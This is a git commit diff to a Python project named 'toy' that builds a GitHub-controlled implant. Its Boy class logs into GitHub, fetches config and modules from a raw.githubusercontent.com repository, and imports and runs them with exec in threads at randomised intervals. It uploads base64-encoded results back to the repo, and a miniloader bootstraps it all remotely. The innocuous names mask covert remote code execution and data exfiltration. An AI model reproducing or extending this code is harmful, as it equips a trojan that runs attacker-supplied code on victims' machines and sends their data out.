224650acccd23bc5d73d51149c6a81dd40b8b43a
test <test@test.com>
2018-01-07 21:10:53 +0800

    test boy

--- toy/boy.py
+++ toy/boy.py
@@ -1,12 +1,13 @@
 #!/usr/bin/env python
 import sys
 import json
+import time
 import base64
 import random
 import Queue
+import threading
 from github3 import login
-# from httpimp import add_remote_repo
-# add_remote_repo(['toy'], 'https://raw.githubusercontent.com/how2how/toy/master/')
+from httpimp import add_remote_repo, remove_remote_repo
 try:
     from urllib2 import urlopen
 except ImportError:
@@ -15,18 +16,30 @@ except ImportError:
 
 class Boy(object):
     _id = 'abc'
-    config_url = 'https://raw.githubusercontent.com/how2how/toy/master/toy/config/'
+    config_url = ('https://raw.githubusercontent.com/how2how/toy/master/toy/'
+                  'config/')
+    moudles_url = (
+        'https://raw.githubusercontent.com/how2how/toy/master/toy/modules')
 
-    def __init__(self, guser, gpass, repo):
-        self.gh = self.repo = self.branch = None
+    def __init__(self, config):
+        guser = config.pop('gu', '')
+        gpass = config.pop('gp', '')
+        grepo = config.pop('gr', '')
+        self.base_modules = config.pop('bm', {})
+        self.task_url = config.pop('tu', self.moudles_url)
+        self.run_modules = config.pop('rm', [])
+        self.cf = int(config.pop('cf', 60))
         self.task_queue = Queue.Queue()
-        self.connect(guser, gpass, repo)
+        self.gh, self.repo, self.branch = Boy.connect(guser, gpass, grepo)
+        for g in (guser, gpass, grepo):
+            del g
 
-    def connect(self, u, p, repo):
-        self.gh = login(username=u, password=p)
-        self.repo = self.gh.repository(u, repo)
-        self.branch = self.repo.branch('master')
-        return
+    @staticmethod
+    def connect(u, p, r, b='master'):
+        gh = login(username=u, password=p)
+        repo = gh.repository(u, r)
+        branch = repo.branch(b)
+        return gh, repo, branch
 
     def save_result(self, data, msg):
         remote_path = 'data/%s/%d.data' % (
@@ -34,8 +47,18 @@ class Boy(object):
         self.repo.create_file(remote_path, msg, base64.b64encode(data))
     return
 
+    def load(module, url):
+        add_remote_repo([module], url)
+        exec "import %s" % module
+
+    def unload(module, url):
+        remove_remote_repo(url)
+        if module in sys.modules:
+            del module
+
     def install(self):
-        pass
+        for pkg, url in self.base_modules.items():
+            add_remote_repo([pkg], url)
 
     @staticmethod
     def get_config(self, config_url):
@@ -53,7 +76,7 @@ class Boy(object):
     def dec(data):
         pass
 
-    def run(self, config):
+    def run(self):
         def worker(m):
             self.task_queue.put(1)
             result = sys.modules[m].run()
@@ -61,4 +84,17 @@ class Boy(object):
             self.save_result(result)
             return
         while True:
-            
+            if self.task_queue.empty():
+                # tasks = self.get_config(self.task_url + self._id + '.json')
+                for rm in self.run_modules:
+                    try:
+                        exec "from toy.modules import %s" % rm
+                        t = threading.Thread(
+                            target=worker, args=(rm,))
+                        t.start()
+                        time.sleep(random.randint(1, 10))
+                    except Exception:
+                        pass
+
+            # time.sleep(random.randint(1000, 10000))
+            time.sleep(self.cf)
--- toy/miniloader.py
+++ toy/miniloader.py
@@ -4,5 +4,5 @@ add_remote_repo(
     ['toy'],
     'https://raw.githubusercontent.com/how2how/toy/master')
 from toy.boy import Boy
-config = Boy.get_config(Boy.config_url + Boy._id + '.json')
-Boy.run(config)
+config = Boy.get_config(Boy.config_url + Boy._id + '.json', True)
+Boy(config).run()
